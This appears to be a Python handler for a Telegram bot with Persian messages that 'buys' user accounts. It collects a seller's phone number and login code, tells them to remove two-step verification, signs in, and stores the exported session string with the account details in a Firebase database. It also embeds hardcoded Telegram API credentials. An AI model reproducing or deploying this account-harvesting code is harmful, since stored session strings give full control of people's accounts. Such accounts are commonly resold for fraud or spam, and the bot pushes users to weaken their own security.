import re
import json
from pyromod import listen
import pyrogram
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from fb import firebase

db = firebase('/bought')

@Client.on_callback_query(group=5)
async def _(Client, Query):
    if Query.data == 'sellaccount':
        pyro = pyrogram.Client(
            'sell',
            api_id=762229,
            api_hash='9749fd3fa72176a0312c45ff5e42228f',
            app_version='1.0',
            device_model='Whitebox Server',
            system_version='1.0',
        )
        await pyro.connect()
        await Query.message.delete()
        Phone = await Client.ask(
            Query.message.chat.id,
            '[✨](https://supportingpueblo.com/wp-content/uploads/2020/04/vendor-top-img.jpg)'+' فروش اکانت\n\nلطفا شماره ای که قصد فروش آن به سرویس ما را دارید را وارد کنید\nهرگاه نیاز داشتید عملیات را لغو کنید دستور /cancel را بزنید'
        )
        while True:
            if Phone.text == '/cancel':
                await Client.send_message(
                    Query.message.chat.id,
                    'عملیات با موفقیت لغو شد.',
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton('🏠 بازگشت به خانه 🏠','index')
                            ],
                        ]
                    )
                )
                return None
            else:
                break
        Waiting = await Client.send_message(Query.message.chat.id,'درحال تلاش برای اتصال...')
        try:
            Valid = re.match(r'(\+[0-9]+\s*)?(\([0-9]+\))?[\s0-9\-]+[0-9]+', Phone.text)
            if not Valid:
                raise Exception('not-valid')
            Hash = await pyro.send_code(Phone.text)
        except Exception as e:
            await Waiting.delete()
            await Client.send_message(Query.message.chat.id,
            'عملیات با خطا مواجه شد.',
            reply_markup=InlineKeyboardMarkup(
                    [
                        [
                            InlineKeyboardButton('🏠 بازگشت به خانه 🏠','index')
                        ],
                    ]
                )
            )
            return None
        await Waiting.delete()
        Code = await Client.ask(
            Query.message.chat.id,
            'لطفا کد ارسالی را برای ما ارسال کنید'
        )
        while True:
            if Code.text == '/cancel':
                await Client.send_message(
                    Query.message.chat.id,
                    'عملیات با موفقیت لغو شد.',
                    reply_markup=InlineKeyboardMarkup(
                        [
                            [
                                InlineKeyboardButton('🏠 بازگشت به خانه 🏠','index')
                            ],
                        ]
                    )
                )
                return None
            else:
                break
        try:
            User = await pyro.sign_in(Phone.text, Hash.phone_code_hash, Code.text)
        except Exception as e:
            await Client.send_message(Query.message.chat.id,'لطفا کد دومرحله ای خود را بردارید و مجددا تلاش کنید.')
            return None
        db.push(dict(
            number=Phone.text.replace(' ',''),
            session=await pyro.export_session_string(),
            seller=json.loads(str(Query.from_user)),
            account=json.loads(str(User))
        ))
        await Client.send_message(Query.message.chat.id,
        'عملیات با موفقیت به اتمام رسید.',
        reply_markup=InlineKeyboardMarkup(
                [
                    [
                        InlineKeyboardButton('🏠 بازگشت به خانه 🏠','index')
                    ],
                ]
            )
        )
        await pyro.disconnect()